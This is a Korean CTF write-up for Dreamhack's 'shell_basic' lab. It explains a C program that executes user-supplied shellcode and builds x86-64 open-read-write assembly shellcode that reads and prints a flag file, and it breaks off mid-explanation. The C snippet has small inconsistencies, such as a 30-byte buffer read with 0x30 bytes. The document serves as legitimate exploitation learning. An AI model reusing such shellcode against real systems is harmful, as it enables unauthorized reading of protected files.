<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
    <h1> Dreamhack "shell_basic"  Write-UP</h1>
</body>
<br>
<br>
</html>

2024.11.12 풀이

![image](https://github.com/user-attachments/assets/b2354a38-5a4a-4d27-960c-c03eaf700cee)

문제 설명을 보면, flag를 출력하는 쉘 코드를 작성해야 할 것으로 보인다. 
다른 부분은 보지 않고, main 함수 부분만 살펴보면 될 것 같아 보인다. 
flag의 위치는 /home/shell_basic/flag_name_is_loooooong 에 있는 것으로 보인다. 

<br>

</br> 

일단 문제 파일부터 살펴보려고 한다.

![image](https://github.com/user-attachments/assets/6d720fa9-2c2e-44a1-83ef-6855580fcecf)

![image](https://github.com/user-attachments/assets/6469b0ba-052a-4bd9-ba95-e7c4f45d78e1)

위와 같은 C 파일이 있는데, 문제 설명에서 main 함수 부분만 살펴보라고 하였으니, main 함수 부분만 살펴보려고 한다.

int argc는 프로그램 실행 시, 전달되는 인자 개수를 말하는 것으로 보이고, 뒤에 char *argc[]는 각 인자의 문자열 배열을 가리키는 것으로 보인다.

`char *shellcode = mmap(...)` 에서 nmap은 새로운 메모리 영역을 할당하는 함수라고 한다. 또한, NULL은 시스템이 적절한 주소를 선택하도록 하는 것으로 보인다.
여기서 할당된 메모리의 크기는 0x1000이며, `PROT_READ | PROT_WRITE | PROT_EXEC` 부분을 통해, 메모리 영역에 읽기, 쓰기, 실행 권한을 부여하는 것 또한 살펴볼 수 있다.
`MAP_PRIVATE | MAP_ANONYMOUS` 을 보니, 익명의 메모리 매핑으로 파일이 아닌 메모리 공간을 할당할 것으로 보인다. 
그 후, 사용자에게 쉘 코드를 입력받고, 이의 시작 주소를 함수 포인터 sc에 할당하는 것으로 보이며, 쉘 코드를 실행할 것으로 보인다. 

즉, 현재 main 부분만 보았을 때는, 사용자로부터 입력된 데이터인 쉘 코를 읽어 실행 권한이 있는 메모리 영역에 저장하고, 그 메모리를 실행하는 것으로 보인다. 

<br>

</br> 

일단 /home/shell_basic/flag_name_is_loooooong 에서 flag 데이터 값을 불러와서, 저장 후에 화면에 출력하게끔 하는 코드를 작성하면 되지 않을까 생각하여 코드를 임의로 작성해보았다. 

<br>

</br> 

```
char buf[30];

int f = open("/home/shell_basic/flag_name_is_loooooong");

read(f, buf, 0x30);
write(1, buf, 0x30);
```
작성한 코드인데, 살펴보면, char buf[30]; 을 통해 30바이트 크기의 문자 배열 buf를 선언하고,

int f = open("/home/shell_basic/flag_name_is_loooooong", RD_ONLY, NULL); 는 
파일을 읽기 전용으로 열고, 이를 그 파일의 파일 디스크립터를 f에 저장하도록 하는 코드이다. 

    "디스크립터"란 OS가 프로그램과 파일, 네트워크 소켓 등과 같은 자원 사이를 연결해주는 고유한 식별자를 말한다고 한다. 
    파일 디스크립터는 특히 파일이나 입출력 스트림과 같은 자원을 참조할 때 사용하는 정수 값이라고 한다. 

<br>

</br> 
또한, read를 통해 파일 디스크립터 f로부터 최대 48바이트를 읽어 buf에 저장하고, write를 통해, buf의 내용을 48바이트만큼 출력하도록 작성해보았다. 

<br>

</br> 

![image](https://github.com/user-attachments/assets/7b398159-8934-4532-b6ac-227e3c6df14d)

하지만, 위 코드의 내용을 그대로 사용하면 안 되고, 어셈블리어로 변환해서 사용해야 되기 때문에, 이를 변환해보려고 한다.
한 번도 작성해본 적이 없어서 어떤 식으로 적어야 할지 감이 안 잡혀서 드림핵에 있는 예제 코드를 활용하여 작성해보려고 한다.

<br>

</br> 

```
section .text
global _start

_start:
    ; Push the file path "/home/shell_basic/flag_name_is_loooooong" onto the stack (역순으로).
    push 0x0                     ; NULL 바이트
    mov rax, 0x676e6f6f6f6f6f6f  ; "oooooong"
    push rax
    mov rax, 0x6c5f73695f656d61  ; "ame_is_l"
    push rax
    mov rax, 0x6e5f67616c662f63  ; "c/flag_n"
    push rax
    mov rax, 0x697361625f6c6c65  ; "ell_basi"
    push rax
    mov rax, 0x68732f656d6f682f  ; "/home/sh"
    push rax

    ; open("/home/shell_basic/flag_name_is_loooooong", RD_ONLY)
    mov rdi, rsp                 ; 파일 경로 주소 (첫 번째 인자)
    xor rsi, rsi                 ; RD_ONLY (두 번째 인자)
    xor rdx, rdx                 ; NULL (세 번째 인자)
    mov rax, 2                   ; open() 시스템 콜 번호
    syscall                      ; open() 호출

    ; rax에 있는 파일 디스크립터를 rdi로 이동 (read()의 첫 번째 인자)
    mov rdi, rax
    ; 버퍼 주소 설정 (rsp - 0x30, 48바이트를 확보)
    sub rsp, 0x30
    mov rsi, rsp                 ; 버퍼 주소 (두 번째 인자)
    mov rdx, 0x30                ; 읽을 바이트 수 (세 번째 인자)
    mov rax, 0                   ; read() 시스템 콜 번호
    syscall                      ; read() 호출

    ; write(1, buf, 0x30)
    mov rdi, 1                   ; stdout (첫 번째 인자)
    mov rax, 1                   ; write() 시스템 콜 번호
    syscall                      ; write() 호출

    ; 프로그램 종료
    xor rdi, rdi                 ; exit(0) (첫 번째 인자)
    mov rax, 0x3c                ; exit() 시스템 콜 번호
    syscall                      ; exit() 호출

```

위와 같은 형식으로 작성해보았다.

## push 코드 설명

![image](https://github.com/user-attachments/assets/3f026b90-c4f6-41ee-96b6-a86086130b2b)

1. `push 0X0`
  : 문자열의 끝을 나타내는 NULL 바이트를 스택에 푸시하는 부분이라고 한다. 이는 문자열의 끝을 알리기 위해 필요하다고 한다.

2. `mov rax, 0x676e6f6f6f6f6f6f`
  : 레지스터 rax에 flag가 저장된 주소 문자열의 일부인 "oooooong" 을 저장하는 부분이다. 이 문자열은 8바이트로 표현되며, 스택에 푸시될 때 역순으로 저장된다고 한다.

3. `push rax`
  : rax에 저장된 "oooooong" 을 스택에 푸시하여 저장하는 부분이다.

4. `mov rax, 0x6c5f73695f656d61`
  : 문자열 "ame_is_l"을 rax에 저장하는 부분이다.

5. `push rax`
  : rax에 저장된 "ame_is_l"을 스택에 푸시한다,

6. `mov rax, 0x6e5f67616c662f63`
  : 문자열 "c/flag_n"을 rax에 저장한다,

7. `push rax`
  : rax에 저장된 "c/flag_n"을 스택에 푸시한다.

8. `mov rax, 0x697361625f6c6c65`
  : 문자열 "ell_basi"를 rax에 저장한다.

